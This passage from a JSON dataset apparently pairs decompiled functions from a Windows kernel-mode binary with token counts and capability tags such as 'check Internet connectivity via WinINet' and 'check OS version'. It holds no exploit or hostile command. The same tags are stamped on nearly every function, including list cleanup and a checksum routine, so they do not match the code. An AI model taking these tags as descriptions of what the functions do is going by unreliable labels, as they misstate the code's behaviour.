        "decompiled_code": "\nvoid fcn.000462b0(void)\n\n{\n    uint *arg_8h;\n    uint var_8h;\n    uint var_4h;\n    \n    *0x800ce918 = 0;\n    fcn.00037640(0x800ce91c, &var_4h, 1);\n    while (arg_8h = *0x800ce928,  *0x800ce928 != NULL) {\n        *0x800ce928 = **0x800ce928;\n        fcn.000357f0(arg_8h);\n    }\n    fcn.00037670(0x800ce91c, &var_4h, 1);\n    return;\n}\n",
        "token_count": 154
    },
    "00046320": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00046320(int32_t arg_8h, uint arg_ch, int32_t arg_10h, uint arg_14h)\n\n{\n    uint *var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0;\n    fcn.00037640(0x800ce91c, &var_8h, 0);\n    var_ch = *0x800ce928;\n    do {\n        if (var_ch == NULL) {\ncode_r0x00046395:\n            fcn.00037670(0x800ce91c, &var_8h, 0);\n            return var_4h;\n        }\n        if ((((var_ch[1] == arg_8h) && (var_ch[2] == arg_10h)) && (*(var_ch + 3) == arg_ch)) &&\n           (*(var_ch + 0xe) == arg_14h)) {\n            var_4h = 1;\n            goto code_r0x00046395;\n        }\n        var_ch = *var_ch;\n    } while( true );\n}\n",
        "token_count": 247
    },
    "00046430": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00046430(int32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = fcn.00046910(arg_ch, arg_10h, *(arg_8h + 0x640), *(arg_8h + 0x644), *(arg_8h + 0x638));\n    if (iVar1 == 0) {\n        iVar1 = 0;\n    }\n    else {\n        (**0x800510c4)(arg_8h + 0x668, 0, 0);\n    }\n    return iVar1;\n}\n",
        "token_count": 152
    },
    "000464e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_40h\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_3ch\n// WARNING: Variable defined which should be unmapped: var_38h\n\nuint __cdecl fcn.000464e0(int32_t arg_8h, int32_t arg_ch, uint32_t arg_10h, uint32_t *arg_14h, int32_t arg_18h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t arg_8h_00;\n    ulong uVar4;\n    uint32_t var_40h;\n    uint var_3ch;\n    uint *var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    uint32_t var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint *var_10h;\n    uint32_t var_ch;\n    uint *var_8h;\n    uint var_4h;\n    \n    *arg_14h = 0;\n    while( true ) {\n        var_24h = arg_8h + 0x654;\n        var_20h = arg_8h + 0x668;\n        uVar4 = fcn.00078be2(arg_18h * -100, arg_18h * -100 >> 0x1f, 10000000, 0);\n        _var_18h = uVar4;\n        iVar2 = (**0x80051228)(2, &var_24h, 1, 0, 0, 0, &var_18h, 0);\n        if (iVar2 == 1) {\n            return 1;\n        }\n        if (iVar2 == 0x102) {\n            return 0x102;\n        }\n        fcn.00037640(arg_8h + 0x648, &var_4h, 1);\n        if (*(arg_8h + 0x664) != 0) break;\n        fcn.00037670(arg_8h + 0x648, &var_4h, 1);\n    }\n    var_8h = *(arg_8h + 0x664);\n    var_10h = *(arg_8h + 0x664);\n    var_1ch = 0;\n    do {\n        if (var_10h == NULL) {\n            *(arg_8h + 0x664) = 0;\ncode_r0x000466c7:\n            if (*(arg_8h + 0x664) != 0) {\n                (**0x800510c4)(arg_8h + 0x654, 0, 0);\n            }\n            fcn.00037670(arg_8h + 0x648, &var_4h, 1);\n            if (var_8h != NULL) {\n                if (arg_10h < var_1ch) {\n                    var_40h = arg_10h;\n                }\n                else {\n                    var_40h = var_1ch;\n                }\n                *arg_14h = var_40h;\n                var_10h = var_8h;\n                for (var_ch = 0; (var_10h != NULL && (var_ch < *arg_14h)); var_ch = var_ch + *piVar1) {\n                    fcn.00078be8(arg_ch + var_ch, var_10h[3], var_10h[2]);\n                    piVar1 = var_10h + 2;\n                    var_10h = *var_10h;\n                }\n                var_38h = var_8h;\n                while (var_38h != NULL) {\n                    puVar3 = *var_38h;\n                    fcn.000357f0(var_38h[3]);\n                    fcn.000357f0(var_38h);\n                    var_38h = puVar3;\n                }\n                fcn.00046800(*(arg_8h + 0x640), *(arg_8h + 0x644), *(arg_8h + 0x638));\n                fcn.00046880(*(arg_8h + 0x640), *(arg_8h + 0x644), *(arg_8h + 0x638));\n            }\n            return 0;\n        }\n        var_1ch = var_1ch + var_10h[2];\n        if (arg_10h <= var_1ch) {\n            if (var_1ch == arg_10h) {\n                *(arg_8h + 0x664) = *var_10h;\n                *var_10h = 0;\n            }\n            else {\n                arg_8h_00 = var_1ch - arg_10h;\n                puVar3 = fcn.000356f0(0x10);\n                iVar2 = fcn.000356f0(arg_8h_00);\n                if ((puVar3 != NULL) && (iVar2 != 0)) {\n                    *puVar3 = 0;\n                    puVar3[1] = 0;\n                    puVar3[2] = 0;\n                    puVar3[3] = 0;\n                    fcn.00078be8(iVar2, (var_10h[3] + var_10h[2]) - arg_8h_00, arg_8h_00);\n                    puVar3[3] = iVar2;\n                    puVar3[2] = arg_8h_00;\n                    *(arg_8h + 0x664) = puVar3;\n                    *puVar3 = *var_10h;\n                    var_10h[2] = var_10h[2] - arg_8h_00;\n                    *var_10h = 0;\n                }\n            }\n            goto code_r0x000466c7;\n        }\n        var_10h = *var_10h;\n    } while( true );\n}\n",
        "token_count": 1410
    },
    "00046880": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00046880(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    var_4h = (**0x800ce798)(*0x800ce904, 0, 0, 0, 0, 0, &var_8h);\n    if ((var_4h == 0) &&\n       (var_4h = (**0x800ce790)(*0x800ce900, 0, 0, arg_8h, arg_ch, arg_10h, 0x14, 3, var_8h, 0, 0x80086af0, 0), \n       var_4h == 0)) {\n        var_8h = 0;\n    }\n    if (var_8h != 0) {\n        (**0x800ce794)(var_8h);\n    }\n    return var_4h;\n}\n",
        "token_count": 232
    },
    "00046910": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.00046910(uint param_1, uint param_2, uint param_3, uint param_4, uint param_5)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint var_8h;\n    uint var_ch;\n    uint var_10h;\n    uint var_14h;\n    uint var_18h_2;\n    uint var_18h;\n    uint var_38h;\n    uint var_34h;\n    int32_t var_2ch;\n    int32_t var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    uchar *puStack28;\n    uint var_10h_2;\n    uint uStack16;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x800b8ce0;\n    uStack16 = 0x800b8bf4;\n    var_10h_2 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_10h_2;\n    puStack28 = &stack0xffffffb8;\n    var_2ch = 0;\n    var_1ch = 0;\n    var_20h = 0;\n    var_28h = (**0x8005128c)(var_8h, var_ch, 0, 0, 0);\n    if (var_28h == 0) {\n        var_24h = -0x3fffff66;\n    }\n    else {\n        var_1ch = fcn.000356f0(0x10);\n        if (var_1ch == 0) {\n            var_24h = -0x3fffff66;\n        }\n        else {\n            var_4h = 0;\n            (**0x80051298)(var_28h, 0, 0);\n            var_4h = 0xffffffff;\n            var_20h = 1;\n            var_24h = (**0x800ce798)(*0x800ce904, 0, 0, var_28h, 0, var_ch, &var_2ch);\n            if (var_24h == 0) {\n                (**0x800510d0)(var_1ch, 1, 0);\n                var_24h = (**0x800ce790)(*0x800ce900, 0, 0, var_10h, var_14h, var_18h_2, 0x14, 0x50000, var_2ch, var_ch\n                                         , 0x80086af0, var_1ch);\n                if (var_24h == 0) {\n                    var_38h = 0x88ca6c00;\n                    var_34h = 0xffffffff;\n                    iVar1 = (**0x80051194)(var_1ch, 0, 0, 0, &var_38h);\n                    if (iVar1 == 0x102) {\n                        var_24h = -0x3fffffff;\n                    }\n                    else {\n                        var_28h = 0;\n                        var_2ch = 0;\n                    }\n                }\n            }\n        }\n        if (var_28h != 0) {\n            if (var_20h != 0) {\n                (**0x80051294)(var_28h);\n            }\n            (**0x800512a4)(var_28h);\n        }\n        if ((var_2ch != 0) && (var_24h != 0)) {\n            (**0x800ce794)(var_2ch);\n        }\n        if (var_1ch != 0) {\n            fcn.000357f0(var_1ch);\n        }\n    }\n    *in_FS_OFFSET = var_10h_2;\n    return var_24h;\n}\n",
        "token_count": 864
    },
    "00046af0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00046af0(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = *(*(arg_ch + 4) + 0x10);\n    if (iVar1 != 0) {\n        (**0x80051294)(iVar1);\n        (**0x800512a4)(iVar1);\n    }\n    (**0x800ce794)(arg_ch);\n    if (arg_8h != 0) {\n        (**0x800510c4)(arg_8h, 0, 0);\n    }\n    return;\n}\n",
        "token_count": 150
    },
    "00046b50": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.00046b50(void)\n\n{\n    if (*0x800ce940 == 0) {\n        fcn.000326c0(0x800ce938);\n        fcn.00037440(0x800ce92c);\n        *0x800ce940 = 1;\n    }\n    return;\n}\n",
        "token_count": 72
    },
    "00046b80": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.00046b80(void)\n\n{\n    int32_t var_8h;\n    uint var_4h;\n    \n    if (*0x800ce940 != 0) {\n        *0x800ce940 = 0;\n        fcn.00037640(0x800ce92c, &var_4h, 0);\n        if (*0x800ce938 != -0x7ff316c8) {\n            for (var_8h = *0x800ce93c; (**0x800510c4)(var_8h + 0x668, 0, 0),  *(var_8h + 4) != -0x7ff316c8;\n                var_8h = *(var_8h + 4)) {\n            }\n        }\n        fcn.00037670(0x800ce92c, &var_4h, 0);\n        while (fcn.00037640(0x800ce92c, &var_4h, 0),  *0x800ce938 != -0x7ff316c8) {\n            fcn.00037670(0x800ce92c, &var_4h, 0);\n            fcn.00043cb0(1000);\n        }\n        fcn.00037670(0x800ce92c, &var_4h, 0);\n        fcn.000376a0(0x800ce92c);\n    }\n    return;\n}\n",
        "token_count": 327
    },
    "00046c70": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.00046c70(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    if (*0x800ce940 == 0) {\n        var_4h = 0;\n    }\n    else {\n        var_4h = fcn.000356f0(0x6a8);\n        if (var_4h == 0) {\n            var_4h = 0;\n        }\n        else {\n            fcn.00078bfa(var_4h, 0, 0x6a8);\n            *(var_4h + 0x624) = arg_10h;\n            *(var_4h + 0x628) = arg_14h;\n            *(var_4h + 0x61c) = arg_8h;\n            *(var_4h + 0x620) = arg_ch;\n            *(var_4h + 0x62a) = arg_20h;\n            *(var_4h + 0x62c) = 0;\n            *(var_4h + 0x640) = arg_18h;\n            *(var_4h + 0x644) = arg_1ch;\n            fcn.00037440(var_4h + 0x648);\n            (**0x800510d0)(var_4h + 0x654, 1, 0);\n            (**0x800510d0)(var_4h + 0x668, 1, 0);\n            (**0x800510d0)(var_4h + 0x678, 1, 0);\n            (**0x800510d0)(var_4h + 0x688, 1, 0);\n            fcn.00037640(0x800ce92c, &var_8h, 1);\n            fcn.000463f0(0x800ce938, var_4h);\n            fcn.00037670(0x800ce92c, &var_8h, 1);\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 516
    },
    "00046de0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00046de0(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    if (arg_ch == 0) {\n        fcn.00037640(0x800ce92c, &var_8h, 0);\n    }\n    if (*0x800ce938 == -0x7ff316c8) {\n        var_4h = 0;\n    }\n    else {\n        for (var_4h = *0x800ce93c; arg_8h != var_4h; var_4h = *(var_4h + 4)) {\n            if (*(var_4h + 4) == -0x7ff316c8) {\n                var_4h = 0;\n                break;\n            }\n        }\n    }\n    if (arg_ch == 0) {\n        fcn.00037670(0x800ce92c, &var_8h, 0);\n    }\n    return var_4h;\n}\n",
        "token_count": 248
    },
    "00046e70": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00046e70(uint32_t arg_8h, int32_t arg_ch)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    ushort extraout_var;\n    ushort extraout_var_00;\n    uint var_ch;\n    uint *var_8h;\n    uint var_4h;\n    \n    fcn.00037640(0x800ce92c, &var_4h, 1);\n    iVar2 = fcn.00046de0(arg_8h, 1);\n    if (iVar2 == 0) {\n        fcn.00037670(0x800ce92c, &var_4h, 1);\n    }\n    else if (((arg_ch == 0) && (*(arg_8h + 0x630) != 0)) && (*(arg_8h + 0x62c) == 2)) {\n        fcn.00037670(0x800ce92c, &var_4h, 1);\n    }\n    else {\n        fcn.000463b0(arg_8h);\n        fcn.00037670(0x800ce92c, &var_4h, 1);\n        fcn.00037640(arg_8h + 0x648, &var_4h, 0);\n        var_8h = *(arg_8h + 0x664);\n        while (var_8h != NULL) {\n            puVar1 = *var_8h;\n            fcn.000357f0(var_8h[3]);\n            fcn.000357f0(var_8h);\n            var_8h = puVar1;\n        }\n        fcn.00037670(arg_8h + 0x648, &var_4h, 0);\n        fcn.000376a0(arg_8h + 0x648);\n        fcn.00038170(*(arg_8h + 0x62a) == 1, 6, *(arg_8h + 0x61c), arg_8h & 0xffff0000 | *(arg_8h + 0x620), \n                     *(arg_8h + 0x624), CONCAT22(extraout_var, *(arg_8h + 0x628)), 0);\n        fcn.000461d0(*(arg_8h + 0x624), arg_8h & 0xffff0000 | *(arg_8h + 0x628), *(arg_8h + 0x61c), \n                     CONCAT22(extraout_var_00, *(arg_8h + 0x620)));\n        fcn.000357f0(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 599
    },
    "00047000": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.00047000(void)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = fcn.000161f0(0x80055218, 0x800ce944);\n    if (iVar1 == 0) {\n        iVar1 = fcn.00016000(*0x800ce944, 0x80087090, 0);\n        if (iVar1 == 0) {\n            iVar1 = 0;\n        }\n        else {\n            (**0x800512e0)();\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 131
    },
    "00047060": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.00047060(void)\n\n{\n    if (*0x800ce944 != 0) {\n        fcn.000160b0(*0x800ce944);\n        (**0x800512e0)();\n    }\n    return;\n}\n",
        "token_count": 54
    },
    "00047120": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_90h\n// WARNING: Variable defined which should be unmapped: var_8ch\n\nuint fcn.00047120(uint param_1, int32_t param_2, int32_t param_3)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint *puVar5;\n    uint *in_FS_OFFSET;\n    uint var_18h;\n    uint var_8h;\n    int32_t var_ch;\n    int32_t var_10h_2;\n    int32_t iVar6;\n    int32_t var_90h;\n    uint var_8ch;\n    int32_t var_78h;\n    int32_t var_68h;\n    int32_t var_60h;\n    uint var_58h;\n    uint var_54h;\n    int32_t var_50h;\n    uint *var_4ch;\n    uint var_48h;\n    int32_t var_44h;\n    int32_t var_40h;\n    uint var_3ch;\n    int32_t var_38h;\n    uint var_34h;\n    int32_t var_1ch;\n    uchar *puStack28;\n    uint var_10h;\n    uint uStack16;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x800b8db0;\n    uStack16 = 0x800b8bf4;\n    var_10h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_10h;\n    puStack28 = &stack0xffffff5c;\n    var_50h = *(var_ch + 0x60);\n    var_4ch = NULL;\n    var_90h = 0;\n    fcn.00078bfa(&var_8ch, 0, 0x38);\n    var_38h = 0;\n    var_44h = 0;\n    var_40h = 0;\n    var_1ch = 0;\n    var_54h = 0;\n    var_48h = 0;\n    var_3ch = 0;\n    if ((var_ch == 0) || (*(var_ch + 0x22) < *(var_ch + 0x23))) {\n        uVar1 = 0xc0000005;\n        goto code_r0x00047451;\n    }\n    if ((*(var_ch + 0x18) == 0) && (*(var_ch + 0x1c) == 0x3c)) {\n        iVar2 = (**0x800511c0)();\n        if (var_10h_2 != iVar2) {\n            (**0x800511c4)(var_10h_2, &var_34h);\n            var_40h = 1;\n        }\n        iVar2 = (**0x8005128c)(*(var_ch + 0x3c), *(var_50h + 4), 0, 0, 0);\n        var_38h = iVar2;\n        if (iVar2 == 0) {\n            var_1ch = -0x3fffff66;\n        }\n        else {\n            var_4h = 0;\n            iVar6 = 0;\n            (**0x80051298)(iVar2, 0, 2);\n            var_44h = 1;\n            var_4ch = (**0x800510e4)(var_38h, 0, 1, 0, 0, 0x10);\n            if (var_4ch == NULL) {\n                var_1ch = -0x3fffff66;\n                var_4h = 0xffffffff;\n            }\n            else if ((var_4ch[9] == 0) && (var_4ch[7] == 0x38)) {\n                puVar4 = var_4ch;\n                puVar5 = &var_90h;\n                for (iVar3 = 0xf; iVar3 != 0; iVar3 = iVar3 + -1) {\n                    *puVar5 = *puVar4;\n                    puVar4 = puVar4 + 1;\n                    puVar5 = puVar5 + 1;\n                }\n                if (var_4ch[6] != 0) {\n                    iVar6 = var_4ch[7] * var_4ch[0xe];\n                    var_78h = fcn.00047680(iVar2, iVar6, &var_54h);\n                    if (var_78h == 0) {\n                        var_1ch = -0x3fffff66;\n                        var_4h = 0xffffffff;\n                        goto code_r0x000473b3;\n                    }\n                }\n                if ((var_4ch[10] == 0) || (var_68h = fcn.00047680(iVar6, var_4ch[0xb] * var_4ch[0xe]),  var_68h != 0)) {\n                    if ((var_4ch[0xc] == 0) ||\n                       (var_60h = fcn.00047680(iVar6, var_4ch[0xd] * var_4ch[0xe]),  var_60h != 0)) {\n                        fcn.00047470(&var_90h);\n                        var_4ch[0xe] = var_58h;\n                        var_4h = 0xffffffff;\n                    }\n                    else {\n                        var_1ch = -0x3fffff66;\n                        var_4h = 0xffffffff;\n                    }\n                }\n                else {\n                    var_1ch = -0x3fffff66;\n                    var_4h = 0xffffffff;\n                }\n            }\n            else {\n                var_4h = 0xffffffff;\n            }\n        }\n    }\ncode_r0x000473b3:\n    if (var_1ch != 0) {\n        *(var_ch + 0x1c) = 0;\n        *(var_ch + 0x18) = var_1ch;\n    }\n    if (var_4ch != NULL) {\n        (**0x800510a8)(var_4ch, var_38h);\n        var_8ch = var_54h;\n        var_90h = var_78h;\n        fcn.00047770(var_78h, var_54h);\n        fcn.00047770(var_68h, var_48h);\n        fcn.00047770(var_60h, var_3ch);\n    }\n    if (var_44h != 0) {\n        (**0x80051294)(var_38h);\n    }\n    if (var_38h != 0) {\n        (**0x800512a4)(var_38h);\n    }\n    if (var_40h != 0) {\n        (**0x800511bc)(&var_34h);\n    }\n    (**0x800512e0)();\n    uVar1 = fcn.00016510(var_8h, var_ch);\ncode_r0x00047451:\n    *in_FS_OFFSET = var_10h;\n    return uVar1;\n}\n",
        "token_count": 1597
    },
    "00047470": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.00047470(uint32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    var_14h = *(arg_8h + 0x18);\n    var_8h = *(arg_8h + 0x18) + 0x1c;\n    var_ch = *(arg_8h + 0x28);\n    var_10h = *(arg_8h + 0x30);\n    var_18h = *(arg_8h + 0x38);\n    var_4h = 0;\n    do {\n        while( true ) {\n            if (*(arg_8h + 0x38) <= var_4h) {\n                fcn.00078bfa(*(arg_8h + 0x1c) * *(arg_8h + 0x38) + *(arg_8h + 0x18), 0, \n                             (var_18h - *(arg_8h + 0x38)) * *(arg_8h + 0x1c), var_18h, var_14h, var_10h, var_ch);\n                fcn.00078bfa(*(arg_8h + 0x2c) * *(arg_8h + 0x38) + *(arg_8h + 0x28), 0, \n                             (var_18h - *(arg_8h + 0x38)) * *(arg_8h + 0x2c));\n                fcn.00078bfa(*(arg_8h + 0x34) * *(arg_8h + 0x38) + *(arg_8h + 0x30), 0, \n                             (var_18h - *(arg_8h + 0x38)) * *(arg_8h + 0x34));\n                return;\n            }\n            iVar1 = fcn.00046320(*(var_14h + 4), var_8h & 0xffff0000 | *(var_14h + 2), *(var_8h + 4), \n                                 arg_8h & 0xffff0000 | *(var_8h + 2));\n            if (iVar1 == 0) break;\ncode_r0x00047506:\n            if (*(arg_8h + 0x28) != 0) {\n                fcn.00078be8(var_ch, var_ch + *(arg_8h + 0x2c), ((*(arg_8h + 0x38) - var_4h) + -1) * *(arg_8h + 0x2c));\n            }\n            if (*(arg_8h + 0x30) != 0) {\n                fcn.00078be8(var_10h, var_10h + *(arg_8h + 0x34), ((*(arg_8h + 0x38) - var_4h) + -1) * *(arg_8h + 0x34))\n                ;\n            }\n            fcn.00078be8(var_14h, var_14h + *(arg_8h + 0x1c), ((*(arg_8h + 0x38) - var_4h) + -1) * *(arg_8h + 0x1c));\n            *(arg_8h + 0x38) = *(arg_8h + 0x38) + -1;\n        }\n        var_18h = *(var_14h + 2);\n        iVar1 = fcn.00038480(var_18h);\n        if (iVar1 != 0) goto code_r0x00047506;\n        var_14h = var_14h + *(arg_8h + 0x1c);\n        var_8h = var_8h + *(arg_8h + 0x1c);\n        var_ch = var_ch + *(arg_8h + 0x2c);\n        var_10h = var_10h + *(arg_8h + 0x34);\n        var_4h = var_4h + 1;\n    } while( true );\n}\n",
        "token_count": 1033
    },
    "00047680": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.00047680(uint param_1, uint param_2, int32_t *param_3)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint var_8h;\n    uint var_ch;\n    int32_t *var_10h;\n    uint var_18h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_10h_2;\n    uint uStack16;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x800b8c68;\n    uStack16 = 0x800b8bf4;\n    var_10h_2 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_10h_2;\n    iVar1 = (**0x8005128c)(var_8h, var_ch, 0, 0, 0);\n    if (iVar1 == 0) {\n        iVar2 = 0;\n    }\n    else {\n        var_4h = 0;\n        (**0x80051298)(iVar1, 0, 2);\n        var_4h = 0xffffffff;\n        iVar2 = (**0x800510e4)(iVar1, 0, 1, 0, 0, 0x10);\n        if (iVar2 == 0) {\n            (**0x80051294)(iVar1);\n            (**0x800512a4)(iVar1);\n            iVar2 = 0;\n        }\n        else {\n            *var_10h = iVar1;\n        }\n    }\n    *in_FS_OFFSET = var_10h_2;\n    return iVar2;\n}\n",
        "token_count": 384
    },
    "00047770": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00047770(int32_t arg_8h, int32_t arg_ch)\n\n{\n    if ((arg_8h != 0) && (arg_ch != 0)) {\n        (**0x800510a8)(arg_8h, arg_ch);\n        (**0x80051294)(arg_ch);\n        (**0x800512a4)(arg_ch);\n    }\n    return;\n}\n",
        "token_count": 91
    },
    "000477b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.000477b0(uint16_t *arg_8h, int32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    uint32_t var_4h;\n    \n    var_4h = arg_8h[9] +\n             arg_8h[8] + arg_8h[7] + arg_8h[6] + arg_8h[5] + arg_8h[4] + arg_8h[3] + arg_8h[2] + arg_8h[1] + *arg_8h;\n    arg_8h = arg_8h + 10;\n    for (arg_ch = arg_ch + -0x14; arg_ch != 0; arg_ch = arg_ch + -4) {\n        var_4h = arg_8h[1] + *arg_8h + var_4h;\n        arg_8h = arg_8h + 2;\n    }\n    uVar1 = (var_4h >> 0x10) + (var_4h & 0xffff);\n    return ~((uVar1 >> 0x10) + uVar1);\n}\n",
        "token_count": 263
    },
    "000478b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
